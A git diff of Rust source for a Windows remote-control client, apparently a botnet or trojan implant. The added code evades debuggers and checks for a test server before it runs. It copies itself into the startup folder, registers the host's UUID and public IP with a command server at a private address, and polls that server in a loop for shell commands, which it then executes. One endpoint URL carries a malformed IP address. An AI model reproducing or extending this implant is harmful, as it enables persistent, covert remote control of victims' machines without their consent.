@@ -1,32 +1,44 @@
+//#![windows_subsystem = "windows"]
+
+mod commands;
 mod node;
+mod utils;
 
 use node::Node;
-use regex::Regex;
 use reqwest::Client;
-use std::collections::hash_map::DefaultHasher;
-use std::hash::{Hash, Hasher};
-use std::{env, fs, io, process, thread, time};
+use serde_json::Value;
+use std::process::{abort, Command};
+use std::{env, fs, thread, time};
+use utils::{calculate_hash, get_uuid};
 use windows::{
     Win32::Foundation::*, Win32::System::Diagnostics::*, Win32::UI::WindowsAndMessaging::*,
 };
-use winreg::enums::*;
-use winreg::RegKey;
 
 #[tokio::main]
 async fn main() {
+    let client: Client = reqwest::Client::builder()
+        .timeout(time::Duration::from_secs(5))
+        .build()
+        .unwrap();
+
     // check if debugger present
     unsafe {
         match Debug::IsDebuggerPresent().as_bool() {
             true => {
                 println!("Debugger detected, exiting...");
-                process::abort();
+                abort();
             }
             false => {}
         }
     }
 
-    // check mouse position, if not moved abort
-    let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
+    // check if test endpoint is returning proper response
+    let brew_check = client.get("http://172.20.0.3:8000/api/brew").send().await;
+
+    if brew_check.unwrap().status() != 418 {
+        println!("Server didn't return 418, exiting...");
+        abort();
+    }
 
     // copy self to startup folder
     let mut path = fs::canonicalize(
@@ -42,22 +54,114 @@ async fn main() {
     path.push(exe);
 
     match fs::copy(env::current_exe().unwrap(), &path) {
-        Ok(_) => {
-            println!("Copied to {}", path.to_str().unwrap());
-            register().await;
-        }
+        Ok(_) => println!("Copied to {}", path.to_str().unwrap()),
         Err(e) => println!("Error: {}", e),
     }
 
-    let _uuid: String = get_uuid();
+    // register to server/get persistent data
+    let mut node: Node = register().await;
 
-    io::stdin().read_line(&mut String::new()).unwrap();
+    println!("{:?}", node);
+
+    // main loop
+    loop {
+        let uuid: String = get_uuid();
+
+        // update realtime data and send
+        node.update_realtime();
+
+        let json = serde_json::to_string(&node).unwrap();
+
+        let update_realtime = client
+            .patch("http://172.20.0.3:8000/api/node/1/")
+            .body(json)
+            .header("Content-Type", "application/json")
+            .header("uuid", uuid.to_owned())
+            .send()
+            .await;
+
+        if let Err(e) = update_realtime {
+            if e.is_timeout() || e.is_connect() {
+                println!("Server issue, retrying...");
+                continue;
+            } else {
+                println!("Error: {}", e);
+                continue;
+            }
+        }
+
+        println!("Update Info: {}", update_realtime.unwrap().status());
+
+        let receive_command = client
+            .get("http://172.20.3:8000/api/receive")
+            .header("uuid", uuid.to_owned())
+            .send()
+            .await;
+
+        if let Err(e) = receive_command {
+            if e.is_timeout() || e.is_connect() {
+                println!("Server issue, retrying...");
+                continue;
+            } else {
+                println!("Error: {}", e);
+                continue;
+            }
+        }
+
+        command(
+            receive_command.unwrap().text().await.unwrap().to_string(),
+            uuid,
+        )
+        .await;
+
+        thread::sleep(time::Duration::from_secs(5));
+    }
 }
 
 async fn register() -> Node {
-    let client: Client = reqwest::Client::new();
+    let client: Client = reqwest::Client::builder()
+        .timeout(time::Duration::from_secs(5))
+        .no_proxy()
+        .build()
+        .unwrap();
 
-    /* Register to server */
+    // get client ip, abort if fail
+    let mut ipv4: String = client
+        .get("https://icanhazip.com/")
+        .send()
+        .await
+        .unwrap()
+        .text()
+        .await
+        .unwrap();
+
+    ipv4 = ipv4.trim().to_string();
+
+    let uuid: String = get_uuid();
+
+    // check if already registered, and get data uuid, random_input if so
+    let path = fs::canonicalize("C:\\ProgramData\\").unwrap();
+
+    for entry in fs::read_dir(path).unwrap() {
+        let entry = entry.unwrap();
+        let path = entry.path();
+
+        if path.is_dir() {
+            let file: &str = path.file_name().unwrap().to_str().unwrap();
+            if file.starts_with(&uuid) {
+                println!("{}", file);
+
+                let random_input: Vec<&str> = file.split(",").collect::<Vec<&str>>();
+
+                let mut node: Node = Node::new(uuid, random_input[1].to_string(), ipv4);
+                node.update_realtime();
+
+                return node;
+            }
+        }
+    }
+
+    // get randomness
     let mut mouse_pos: Vec<i32> = Vec::new();
 
     for _ in 0..1024 {
@@ -76,62 +180,87 @@ async fn register() -> Node {
 
     let random_input: String = calculate_hash(&mouse_pos_str).to_string();
 
-    let uuid: String = get_uuid();
-
-    let ipv4: String = client
-        .get("https://icanhazip.com/")
-        .send()
-        .await
-        .unwrap()
-        .text()
-        .await
-        .unwrap();
-
-    // remove \n from ipv4
-    let ipv4: String = ipv4.trim().to_string();
-
-    let mut node: Node = Node::new(uuid, random_input, ipv4);
+    // create node and register to server
+    let mut node: Node = Node::new(uuid.to_owned(), random_input.to_owned(), ipv4);
     node.update_realtime();
 
     let json: String = serde_json::to_string(&node).unwrap();
 
-    let register_resp = client
+    let register = client
         .post("http://172.20.0.3:8000/api/node/")
         .body(json)
         .header("Content-Type", "application/json")
         .send()
-        .await
-        .unwrap();
+        .await;
 
-    if register_resp.status().is_success() {
-        println!("Registered to server");
-    } else {
-        println!("Error: {}", register_resp.status());
+    if let Err(e) = register {
+        println!("Server issue, {}", e);
+        abort();
     }
 
+    // create presistent data
+    let mut path = fs::canonicalize("C:\\ProgramData\\").unwrap();
+    path.push(format!("{},{}", uuid, random_input));
+
+    match fs::create_dir(path.to_owned()) {
+        Ok(_) => println!("Created dir {}", path.to_str().unwrap()),
+        Err(e) => println!("Error: {}", e),
+    }
     return node;
 }
 
-fn calculate_hash<T: Hash>(t: &T) -> u64 {
-    /*
-    may need to hash differently,
-    because function only returns u64,
-    so someone could theoretically bruteforce the random_input
-    */
+async fn command(command_json: String, uuid: String) {
+    let client: Client = reqwest::Client::builder()
+        .timeout(time::Duration::from_secs(5))
+        .build()
+        .unwrap();
 
-    let mut s: DefaultHasher = DefaultHasher::new();
-    t.hash(&mut s);
-    s.finish()
-}
+    let json: Vec<Value> = serde_json::from_str(&command_json.as_str()).unwrap();
 
-fn get_uuid() -> String {
-    let regex: Regex = Regex::new(r"\{|\}|").unwrap();
+    // get commands from json and add them to array of commands
+    for command in json {
+        println!("{:?}", command);
 
-    let hklm: RegKey = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let key: RegKey = hklm.open_subkey("SYSTEM\\HardwareConfig\\").unwrap();
-    let raw_uuid: String = key.get_value("LastConfig").unwrap();
+        if command["repeat_at"] != serde_json::json!(null) {
+            return;
+        }
 
-    let uuid: String = regex.replace_all(&raw_uuid, "").to_string();
+        let command_type = command["command_type"].as_str().unwrap().to_string();
 
-    return uuid;
+        if command_type == "shell" {
+            let args: Vec<String> = command["command"]
+                .as_str()
+                .unwrap()
+                .split(" ")
+                .map(|s| s.to_string())
+                .collect();
+
+            let program: String = args[0].to_string();
+
+            // signal command has been run (really received)
+            let signal = client
+                .get("http://172.20.0.3:8000/api/signal")
+                .header("uuid", uuid)
+                .query(&[("command-id", command["id"].as_u64().unwrap())])
+                .send()
+                .await;
+
+            if let Err(e) = signal {
+                println!("Error: {}", e);
+                abort();
+            }
+
+            // run command with args
+            match Command::new(program.as_str()).args(&args[1..]).spawn() {
+                Ok(mut child) => {
+                    child.wait().unwrap();
+                }
+                Err(e) => println!("Error: {}", e),
+            }
+
+            return;
+        } else if command_type == "macro" {
+            return;
+        }
+    }
 }
